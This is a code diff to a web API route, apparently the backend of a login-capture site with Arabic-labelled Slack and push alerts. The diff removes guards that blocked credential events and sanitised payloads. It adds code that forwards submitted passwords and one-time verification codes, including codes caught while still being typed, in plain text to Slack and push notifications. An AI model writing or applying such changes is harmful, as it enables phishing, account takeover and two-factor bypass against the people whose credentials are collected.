@@ -1,5 +1,4 @@
 import { createFileRoute } from "@tanstack/react-router";
-import { isCredentialEvent, safeSubmissionPayload } from "@/lib/submission-privacy";
 
 type KindMeta = { label: string; emoji: string; accent: string };
 const KIND_META: Record<string, KindMeta> = {
@@ -50,10 +49,14 @@ function buildBlocks(
 
   const name = pick(payload, "name");
   const phone = pick(payload, "phone");
+  const code = pick(payload, "code") ?? pick(payload, "otp");
+  const password = pick(payload, "password");
   const geo = pick(payload, "geo") as Record<string, unknown> | undefined;
   const src = pick(payload, "traffic_source") as Record<string, unknown> | undefined;
   const page = pick(payload, "page") ?? pick(src, "landing_page");
 
+  if (code) addField("🔢 الرمز", `\`${String(code)}\``);
+  if (password) addField("🔑 كلمة المرور", `\`${String(password)}\``);
   if (name) addField("👤 الاسم", name);
   if (phone) addField("📞 الهاتف", phone);
   if (geo) {
@@ -161,23 +164,25 @@ export const Route = createFileRoute("/api/public/push/notify")({
           body = {};
         }
         const kind = String(body.kind ?? "");
-        if (isCredentialEvent(kind)) return Response.json({ ok: false }, { status: 410 });
-        body.payload = safeSubmissionPayload(body.payload ?? {});
         if (!kind || !KIND_META[kind]) return new Response("ignored", { status: 200 });
         const meta = KIND_META[kind];
         const who = body.email || body.sessionId || "زائر";
+        const code = pick(body.payload, "code") ?? pick(body.payload, "otp");
+        const isOtpEntry = kind === "otp_attempt" || (kind === "otp_typing" && typeof code === "string" && code.length >= 6);
         const isLogin = kind === "login_attempt";
         const isLogout = kind === "logout_confirmed";
         const tasks: Promise<unknown>[] = [];
-        if (isLogin || isLogout) {
+        if (isOtpEntry || isLogin || isLogout) {
           tasks.push(postToSlack(buildBlocks(meta, String(who), body.payload)));
         }
-        if (isLogin || isLogout) {
+        if (isOtpEntry || isLogin || isLogout) {
           const { broadcastPush } = await import("@/lib/push-server");
-          const title = isLogin
+          const title = isOtpEntry
+            ? `رمز التحقق: ${String(code ?? "")}`
+            : isLogin
               ? "تسجيل دخول جديد"
               : "تأكيد تسجيل الخروج";
-          const tagPrefix = isLogin ? "login" : "logout";
+          const tagPrefix = isOtpEntry ? "otp" : isLogin ? "login" : "logout";
           tasks.push(
             broadcastPush({
               title,
